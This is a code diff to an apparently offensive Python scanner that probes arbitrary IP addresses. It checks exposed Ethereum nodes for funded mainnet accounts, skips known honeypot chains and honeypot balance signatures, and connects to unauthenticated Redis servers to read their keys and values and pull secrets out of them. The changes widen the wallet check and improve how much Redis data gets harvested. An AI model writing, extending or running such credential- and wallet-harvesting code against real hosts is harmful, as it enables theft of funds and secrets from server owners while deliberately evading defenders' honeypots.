@@ -139,27 +139,27 @@ def probe_eth(ip):
                   'balances': {}, 'total_eth': 0}
 
         if chain_id in HONEYPOT_CHAINS:
-            return None  # Known testnet/honeypot chain
+            return None
 
-        if chain_id == 1:
-            # Real mainnet — check balances
-            for addr in accounts[:10]:
-                try:
-                    eth = eth_mainnet_balance(addr)  # verify on public chain, not local node
-
-                    # Skip known honeypot balance signatures
-                    if eth in HONEYPOT_ETH_BALANCES:
-                        return None
+        # Always verify balance on public chain regardless of chain_id
+        # chain_id=0 means eth_chainId failed — still check accounts on mainnet
+        funded = False
+        for addr in accounts[:10]:
+            try:
+                eth = eth_mainnet_balance(addr)
+                if eth in HONEYPOT_ETH_BALANCES:
+                    return None
+                if eth > 0:
                     result['balances'][addr] = eth
                     result['total_eth'] += eth
-                except:
-                    pass
-            if result['total_eth'] > 0:
-                print(f'  MAINNET FUNDED: {ip} total={result["total_eth"]:.4f} ETH', flush=True)
-            else:
-                return None  # Mainnet but empty
-        else:
-            return None  # Unknown chain — skip
+                    funded = True
+            except:
+                pass
+
+        if funded:
+            print(f'  MAINNET FUNDED: {ip} chain={chain_id} total={result["total_eth"]:.4f} ETH', flush=True)
+            return result
+        return None
 
         return result
     except:
@@ -235,6 +235,24 @@ def probe_elastic(ip):
     except:
         return None
 
+def redis_parse_keys(raw):
+    keys = []
+    lines = raw.split('\r\n')
+    i = 0
+    while i < len(lines):
+        line = lines[i]
+        if line.startswith('$') and i + 1 < len(lines):
+            try:
+                length = int(line[1:])
+                if length > 0:
+                    keys.append(lines[i + 1])
+                i += 2
+            except:
+                i += 1
+        else:
+            i += 1
+    return [k for k in keys if k and k != '0']
+
 def probe_redis(ip):
     try:
         import socket
@@ -242,28 +260,29 @@ def probe_redis(ip):
         s.settimeout(TIMEOUT)
         s.connect((ip, 6379))
 
-        def cmd(*args):
+        def send_cmd(*args):
             c = f'*{len(args)}\r\n' + ''.join(f'${len(str(a))}\r\n{a}\r\n' for a in args)
             s.send(c.encode())
-            return s.recv(65536).decode('utf-8', errors='replace')
+            data = b''
+            while True:
+                chunk = s.recv(65536)
+                data += chunk
+                if len(chunk) < 65536:
+                    break
+            return data.decode('utf-8', errors='replace')
 
-        pong = cmd('PING')
-        if 'PONG' not in pong and 'NOAUTH' not in pong:
+        pong = send_cmd('PING')
+        if '+PONG' not in pong:
             s.close()
-            return None
+            return None  # auth required or not Redis
 
-        if 'NOAUTH' in pong:
-            s.close()
-            return None  # auth required
-
-        # Scan keys
-        keys_resp = cmd('SCAN', '0', 'COUNT', '200')
-        keys = [k for k in keys_resp.split('\r\n') if k and not k.startswith(('*', '$', ':'))]
+        keys_resp = send_cmd('SCAN', '0', 'COUNT', '200')
+        keys = redis_parse_keys(keys_resp)
 
         secrets = []
-        for key in keys[:100]:
+        for key in keys[:150]:
             try:
-                val = cmd('GET', key)
+                val = send_cmd('GET', key)
                 text = f'{key}={val}'
                 found = find_secrets(text)
                 if found:
@@ -276,8 +295,8 @@ def probe_redis(ip):
 
         s.close()
         result = {'ip': ip, 'port': 6379, 'type': 'redis', 'keys': len(keys), 'secrets': secrets}
-        print(f'  REDIS: {ip} keys={len(keys)} secrets={len(secrets)}', flush=True)
-        return result if secrets or len(keys) > 0 else None
+        print(f'  REDIS: {ip} keys_found={len(keys)} secrets={len(secrets)}', flush=True)
+        return result if (secrets or len(keys) > 0) else None
     except:
         return None
 
